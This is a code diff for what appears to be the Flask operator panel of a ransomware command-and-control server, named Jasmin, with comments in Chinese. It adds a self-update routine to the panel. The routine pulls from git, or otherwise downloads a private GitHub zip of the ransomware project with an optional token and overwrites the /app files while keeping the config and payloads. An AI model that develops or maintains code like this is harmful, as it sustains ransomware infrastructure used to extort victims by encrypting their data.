@@ -217,12 +217,48 @@ def check_update():
 @app.route('/do_update', methods=['POST'])
 @login_required
 def do_update():
-    import subprocess
-    root = os.path.dirname(os.path.dirname(__file__))
+    import subprocess, zipfile, tempfile, shutil, urllib.request
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    token = os.environ.get('GIT_TOKEN','')
+    # 方式1: git pull
     if os.path.isdir(os.path.join(root, '.git')):
         r = subprocess.run(['git', 'pull'], cwd=root, capture_output=True, text=True, timeout=30)
-        return jsonify(ok=True, method='git', output=r.stdout + r.stderr)
-    return jsonify(ok=False, msg='无.git目录，请手动更新')
+        return jsonify(ok=True, method='git pull', output=r.stdout + r.stderr)
+    # 方式2: zip下载覆盖
+    url = f'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/zipball/master'
+    req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
+    if token:
+        req.add_header('Authorization', f'token {token}')
+    try:
+        resp = urllib.request.urlopen(req, timeout=30)
+        tmp = tempfile.mktemp(suffix='.zip')
+        with open(tmp, 'wb') as f:
+            f.write(resp.read())
+        tmpdir = tempfile.mkdtemp()
+        with zipfile.ZipFile(tmp, 'r') as zf:
+            zf.extractall(tmpdir)
+        os.unlink(tmp)
+        # 找到解压后的子目录
+        dirs = [d for d in os.listdir(tmpdir) if os.path.isdir(os.path.join(tmpdir, d))]
+        if not dirs:
+            return jsonify(ok=False, msg='解压后未找到目录')
+        src = os.path.join(tmpdir, dirs[0], 'Web Panel Python')
+        if os.path.isdir(src):
+            # 覆盖当前app目录(保留config.json和payloads)
+            for item in os.listdir(src):
+                s = os.path.join(src, item)
+                d = os.path.join('/app', item)
+                if item in ('config.json', 'payloads'):
+                    continue
+                if os.path.isdir(s):
+                    if os.path.exists(d): shutil.rmtree(d)
+                    shutil.copytree(s, d)
+                else:
+                    shutil.copy2(s, d)
+        shutil.rmtree(tmpdir)
+        return jsonify(ok=True, method='zip下载', msg='更新完成，请刷新页面')
+    except Exception as e:
+        return jsonify(ok=False, msg=f'下载更新失败: {e}')
 
 # ── Startup ──
 if __name__ == '__main__':
